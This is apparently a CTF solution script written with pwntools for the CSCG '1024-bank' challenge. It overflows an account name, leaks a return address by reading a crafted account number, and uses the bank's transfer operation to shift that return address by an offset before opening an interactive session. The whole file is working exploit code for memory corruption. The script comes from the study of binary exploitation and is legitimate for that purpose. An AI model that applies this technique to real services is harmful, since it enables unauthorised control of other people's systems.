import pwn
host = "localhost"
port = 1025
#host = "a317b790e0b67fb90fb5cff0-1024-bank.challenge.cscg.live"
#port = 1337

pwn.context.log_level = 'error'
try:

    #p = pwn.remote(host, port, ssl = True )
    p = pwn.remote(host, port)

    def add_acc(val):
        p.sendafter(b"choice: ",b"1")
        p.sendline(80 * b'B' + 3*b'A')
        p.sendlineafter(b"Balance: ", val)
        p.recvline()
        return p.recvline().split(b"Number: ")[1][:-1]
        

    def read(acc_num):
        p.sendlineafter(b"choice: ",b"2")
        p.sendlineafter(b"Number: ",acc_num)
        acc = p.recvline()
        name = p.recvline()
        bal = p.recvline()
        if b"Balance" not in bal:
            bal = p.recvline()
        print(acc)
        print(name)
        print(bal)
        bal = bal.split(b"Balance: ")[1][:-1]
        return bal
    
    def transfer(sender, receiver, amount):
        p.sendlineafter(b"choice: ", b"3")
        p.sendlineafter(b"Number: ", sender)
        p.sendlineafter(b"Number: ", receiver)
        p.sendlineafter(b"Amount: ", amount)

    def stop():
        p.sendlineafter(b"choice: ", b"4")

    
    offset = 0x150 - 0x37
    tmp = add_acc(f"{offset}".encode())
    tar = 0x414141
    ret_address = int(read(f'{tar}'.encode()).decode())
    print(hex(ret_address))
    input()
    transfer(tmp, f"{tar}".encode(), f"{offset}".encode())
    print(hex(ret_address))
    stop()
    p.interactive()
except EOFError:
    p.close()
